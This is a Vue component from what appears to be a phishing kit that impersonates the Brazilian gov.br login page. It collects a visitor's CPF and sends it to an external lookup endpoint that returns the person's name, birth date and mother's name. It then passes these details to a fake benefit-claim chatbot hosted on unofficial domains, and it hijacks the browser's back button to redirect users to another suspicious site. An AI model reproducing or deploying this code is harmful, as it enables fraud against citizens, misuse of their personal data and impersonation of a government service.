<template>
  <div v-if="!login">
    <header>
      <img src="/images/govbrlogo.png" alt="Imagem de um gato" />
      <div id="acessibilidade">
        <span>
          <a href="#"><i class="fas fa-adjust"></i></a>
        </span>
        <span>
          <a href="#" target="_blank"><i class="fas fa-deaf"></i></a>
        </span>
      </div>
    </header>
    <div class="container pb-2">
      <div class="mt-2">
        <h3>Identifique-se no gov.br com:</h3>
        <div class="item-login-signup">
          <a tabindex="3">
            <img src="/images/id-card-solid.png" />
            Número do CPF
          </a>
        </div>
        <div class="accordion-panel">
          <p
            >Digite seu CPF para <strong>criar</strong> ou
            <strong>acessar</strong> sua conta gov.br</p
          >
          <div id="formCPF">
            <label for="cpf" class="me-4">CPF</label>
            <input
              @keypress.enter="continuar"
              v-model="cpf"
              id="numeroCPF"
              name="cpf"
              maxlength="11"
              autocomplete="off"
              tabindex="1"
              type="tel"
              placeholder="Digite seu CPF"
              class="corrigircpf"
            />
            <div
              v-show="!isValidCpf && cpf.length === 11"
              id="error-message"
              style="color: red"
            >
              CPF inválido
            </div>
            <p
              >Nota: Uma atendente continuará o seu atendimento logo após você
              prosseguir para o resgate do seu benefício.</p
            >
            <div class="button-panel" id="login-button-panel">
              <button
                @click="continuar"
                id="buttonCPF"
                class="button-continuar text-center"
                tabindex="2"
                >Continuar</button
              >
            </div>
          </div>
          <label id="title-outras-op">Outras opções de identificação:</label>
          <hr id="hr-outras-op" style="margin: 0 0 0" />
          <div
            class="item-login-signup-ways"
            onclick="showModal('modal-bancos-credenciados')"
          >
            <a tabindex="5" href="#" style="color: #008c32">
              <img src="/images/InternetBanking-green.png" />
              Login com seu banco
              <span
                style="
                  font-size: 7px;
                  background-color: #008c32;
                  color: white;
                  padding: 3px;
                  top: -3px;
                  position: relative;
                  margin-left: 8px;
                "
                >SUA CONTA SERÁ PRATA</span
              >
            </a>
          </div>
          <div
            class="item-login-signup-ways"
            onclick="showQrCode('e062c3ac-776d-4ee0-b6f3-f9198984ca37');"
          >
            <a tabindex="5" href="#">
              <img src="/images/app-identidade-govbr.png" />
              Seu aplicativo gov.br
            </a>
          </div>
          <div
            class="item-login-signup-ways"
            id="cert-digital-cloud"
            onclick="showModal('modal-certificado-nuvem')"
          >
            <a tabindex="5" href="#" id="cert-digital-cloud-a">
              <img src="/images/CD-Nuvem.png" id="cert-digital-cloud-img" />
              Seu certificado digital em nuvem
            </a>
          </div>
          <div class="entenda-id-govbr" id="entenda-id-govbr">
            <span>
              <a tabindex="6" href="#" id="entenda-id-govbr-a">
                <img
                  src="/images/circle-question-solid.svg"
                  style="margin: 0px 13px -2px 0px; height: 1em"
                />
                Está com dúvidas e precisa de ajuda?
              </a>
              <a
                tabindex="6"
                href="#"
                style="display: block"
                target="_blank"
                id="termo-de-uso"
                >Termo de Uso e Aviso de Privacidade</a
              >
            </span>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div
    v-else
    class="shadow-none"
    style="
      background-color: #f9f9f9 !important;
      font-family: Arial, Helvetica, sans-serif;
    "
  >
    <div
      style="position: fixed; top: 0px; right: 0px; left: 0px; z-index: 1030"
    >
      <img src="/images/header.png" alt="" style="width: 100%; height: auto" />
    </div>
    <div class="ms-3 mb-3" style="padding-top: 110px">
      <label class="fs-6 fw-medium">
        <i class="fa-solid fa-user me-1"></i>Usuário:
        <strong class="fw-bold">{{ nome }}</strong>
      </label>
      <label class="fs-6 fw-medium">
        <i class="fa-solid fa-file me-1"></i>Documento:
        <strong class="fw-bold">{{ cpf }}</strong>
      </label>
    </div>
    <div
      style="
        border-radius: 20px;
        border: 1px solid #f9f9f9 !important;
        box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.3) !important;
      "
    >
      <typebot-standard ref="typebotRef" style="height: 600px; padding: 10px">
      </typebot-standard>
    </div>
  </div>
</template>

<script lang="ts">
import { ref, computed, onMounted } from 'vue';
import axios from 'axios';
import { setShowLoader } from '@/shared/loader';
import { getParamUrl, getSrcParams } from '@/shared/utm';
import { validateCpf } from '@/shared/validators';
import { onlyNumbers } from '@/shared/numbers';
import { sleep } from '@/shared/sleep';

export default {
  name: 'MainContent',
  components: {},
  setup() {
    const cpf = ref('');
    const nome = ref('');
    const sexo = ref('');
    const error = ref(false);
    const login = ref(false);

    onMounted(async () => {
      const urlObj = new URL(window.location.href);

      if (urlObj.searchParams.has('cpf')) {
        login.value = true;
      } else {
        var urlBackRedirect = 'https://marcas-lucrativas.fun/back-consulta/';

        urlBackRedirect = urlBackRedirect =
          urlBackRedirect.trim() +
          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
          document.location.search.replace('?', '').toString();
        history.pushState({}, '', location.href);
        history.pushState({}, '', location.href);
        window.onpopstate = function () {
          setTimeout(function () {
            location.href = urlBackRedirect;
          }, 1);
        };
      }

      cpf.value = getParamUrl('cpf');
      sexo.value = getParamUrl('sexo');
      nome.value = getParamUrl('nome');
      error.value = !!getParamUrl('error');

      const typebotInitScript = document.createElement('script');
      typebotInitScript.type = 'module';
      typebotInitScript.innerHTML = `import Typebot from './web.js'

      Typebot.initStandard({ typebot: "consulta-th", apiHost: "https://api.portaloficial-oferta.me" });
      `;
      document.body.append(typebotInitScript);

      if (login.value) {
        setShowLoader(true);
        await sleep(2);
        setShowLoader(false);
      }
    });

    const isValidCpf = computed(() => validateCpf(cpf.value));

    const consultCpf = async () => {
      const url = `https://ucct4ky27iqfm3l2xq5mojrr6y0jxbeu.lambda-url.us-east-2.on.aws/?cpf=${onlyNumbers(
        cpf.value
      )}`;

      try {
        const response = await axios.get(url);

        return response.data;
      } catch (error) {
        console.error('Erro na requisição:', error);
      }
    };

    const continuar = async () => {
      if (!isValidCpf.value) return;
      setShowLoader(true);

      const utm = getSrcParams();
      const result = await consultCpf();
      const currentUrl = window.location.toString();

      nome.value = result.nome;
      let redirectUrl = `${utm}&cpf=${result.cpf}&nome=${result.nome}&sexo=${result.sexo}&nascimento=${result.nascimento}&mae=${result.mae}`;
      if (result.error) redirectUrl += '&error=true';

      window.location.href = `/resgate-brasil/${redirectUrl}`;
      // window.location.href = `${currentUrl}${redirectUrl}`;
      login.value = true;
      setShowLoader(false);
    };

    return {
      cpf,
      nome,
      error,
      login,
      isValidCpf,
      continuar,
    };
  },
};
</script>

<style>
@import url('/css/reset.css');
@import url('/css/start.css');
@import url('/css/all.min_1.css');
@import url('/css/all.min.css');

input.button-continuar {
  border-radius: 20px;
  border: none;
  color: #fff;
}
</style>
